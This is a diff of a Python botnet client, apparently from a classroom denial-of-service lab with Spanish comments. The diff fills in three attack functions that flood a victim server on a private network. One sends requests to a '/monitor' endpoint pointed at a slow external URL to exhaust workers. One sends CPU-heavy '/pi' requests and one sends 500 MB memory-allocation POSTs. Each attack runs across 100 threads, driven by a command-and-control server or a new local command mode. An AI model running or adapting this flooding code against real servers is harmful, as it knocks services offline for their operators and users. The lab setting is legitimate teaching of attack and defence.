@@ -8,17 +8,18 @@ import socket
 import threading
 import requests
 import time
+import sys
 import random
 
 # --- CONFIGURACIÓN ---
-CNC_IP = "192.168.Y.Y"   # IP del servidor CnC (tu ordenador)
+CNC_IP = "192.168.0.17"   # IP del servidor CnC (tu ordenador)
 CNC_PORT = 9999
 
-TARGET_IP = "192.168.X.X" # IP de la Víctima (Servidor a atacar)
+TARGET_IP = "192.168.0.18" # IP de la Víctima (Servidor a atacar)
 BASE_URL = f"http://{TARGET_IP}"
 
 # Número de hilos simultáneos
-NUM_HILOS = 50
+NUM_HILOS = 100
 
 # --- ZONA DEL ALUMNO: ARSENAL ---
 # Tarea: Rellena estas funciones con las peticiones que has diseñado
@@ -27,9 +28,12 @@ NUM_HILOS = 50
 def ataque1():
     """
     Se ejecuta cuando el C&C manda: A1
+    Ataca workers
     """
     try:
-        # TODO: Escribe aquí tu código para el primer ataque
+        # Hosteamos en el puerto 80 un black hole: nc -lkp 80
+        # requests.get(f"{BASE_URL}/monitor?target=192.168.0.17") 
+        requests.get(f"{BASE_URL}/monitor?target=https://httpbin.org/delay/5")
         pass
     except:
         pass
@@ -37,9 +41,10 @@ def ataque1():
 def ataque2():
     """
     Se ejecuta cuando el C&C manda: A2
+    Ataca CPU
     """
     try:
-        # TODO: Escribe aquí tu código para el segundo ataque
+        requests.get(f"{BASE_URL}/pi?iterations=1000000") # Hosteamos en el puerto 80 un black hole: nc -lkp 80
         pass
     except:
         pass
@@ -49,7 +54,7 @@ def ataque3():
     Se ejecuta cuando el C&C manda: A3
     """
     try:
-        # TODO: Escribe aquí tu código para el tercer ataque
+        requests.post(f"{BASE_URL}/allocations", data='{"mb":500}') # Hosteamos en el puerto 80 un black hole: nc -lkp 80
         pass
     except:
         pass
@@ -69,16 +74,17 @@ def ejecutar_ataque(tipo_ataque):
         return
 
     stop_event = threading.Event()
-
     # Lanzamos los hilos de ataque
-    for _ in range(NUM_HILOS):
-        t = threading.Thread(target=bucle_infinito, args=(funcion_objetivo,stop_event))
-        t.daemon = True 
-        t.start()
-        
+    try:
+        for _ in range(NUM_HILOS):
+            t = threading.Thread(target=bucle_infinito, args=(funcion_objetivo,stop_event))
+            t.daemon = True 
+            t.start()
+        time.sleep(15)
+    except KeyboardInterrupt:
+        pass
     # Mantenemos el ataque 15 segundos y paramos automáticamente
     # para no quemar la red ni los portátiles
-    time.sleep(15)
     print("[*] Fin de la ráfaga. Esperando nuevas órdenes...")
     stop_event.set()
 
@@ -86,7 +92,7 @@ def bucle_infinito(funcion, stop_event):
     while not stop_event.is_set():
         funcion()
         # Pequeña pausa técnica para evitar bloqueos locales
-        time.sleep(0.02)
+        time.sleep(0.01)
 
 def conectar_cnc():
     print(f"[*] Buscando al Maestro en {CNC_IP}:{CNC_PORT}...")
@@ -112,4 +118,23 @@ def conectar_cnc():
             time.sleep(5)
 
 if __name__ == "__main__":
+    if sys.argv[1] == "-d":
+        print("Posibles comandos: cpu, ram, workers, quit")
+        while True:
+            try:
+                cmd = input("> ").strip().lower()
+                if cmd[0] == 'w':
+                    ejecutar_ataque("A1")
+                elif cmd[0] == 'c':
+                    ejecutar_ataque("A2")
+                elif cmd[0] == 'r':
+                    ejecutar_ataque("A3")
+                elif cmd[0] in ['q', 'e']:
+                    break
+            except KeyboardInterrupt :
+                break
+            except EOFError:
+                break
+        exit()
+
     conectar_cnc()
